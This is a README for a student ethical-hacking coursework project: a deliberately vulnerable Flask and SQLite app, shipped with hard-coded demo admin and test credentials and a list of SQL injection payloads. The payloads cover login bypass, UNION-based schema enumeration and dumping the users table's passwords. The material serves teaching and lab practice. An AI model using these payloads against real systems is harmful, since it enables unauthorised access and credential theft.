# F20AN-CW1  

### SQL Injection Project – Ethical Hacking Coursework  

This project demonstrates SQL injection vulnerabilities as part of an ethical hacking course.  

## Contributors  
- Aryan R  
- Patson D  

## Setup & Execution  

1. **Install Dependencies**  
   Ensure you have a Python environment set up, then install the required dependencies:  
   ```bash
   pip install -r requirements.txt 
   ```

2. **Set Up the Database**  
Navigate to the 'flask app' directory and run:
    ```bash
   python setupDatabase.py
   ```
   The following output should be generated during its first execution:
   ```bash
    Users added
    Admin user and test user created.

    admin creds: 
            u:patson
            p:dubai2020!
    test user creds: 
            u:sharafdg
            p:passsw0rd!
                      
    Stock items added.

    Database setup complete.
   ```
   This initializes the SQL database.

3. **Run the Application**  
Start the Flask app: 
    ```bash
    python myApp.py
    ```
    Then, open your browser and go to:  
    http://127.0.0.1:5000/

4. **Example Exploits (for SQLite):**

   - **Bypass login with comment (login page)**
     ```
     admin'-- 
     ```

   - **Bypass login with OR (login page)**
     ```
     admin' OR '1' = '1
     ```

   - **Check if injection is possible (stock page)**
     ```
     ' UNION SELECT 1,2,3,4,5; --
     ```

   - **Get SQLite version (stock page)**
     ```
     ' UNION SELECT sqlite_version(),2,3,4,5; --
     ```

   - **Show tables (stock page)**
     ```
     ' UNION SELECT name, type, 3,4,5 FROM sqlite_master; --
     ```

   - **Show SQL query with table info (stock page)**
     ```
     ' UNION SELECT sql, 2,3,4,5 FROM sqlite_master WHERE type='table' AND name='users'; --
     ```

   - **Dump all users (stock page)**
     ```
     %' UNION SELECT username, password, 1, 2, 3 FROM users; --
     ```

   - **List all tables and SQL schema (stock page)**
     ```
     ' UNION SELECT type, name, tbl_name, rootpage, sql FROM sqlite_master; --
     ```

---
This project is intended for the f20an coursework.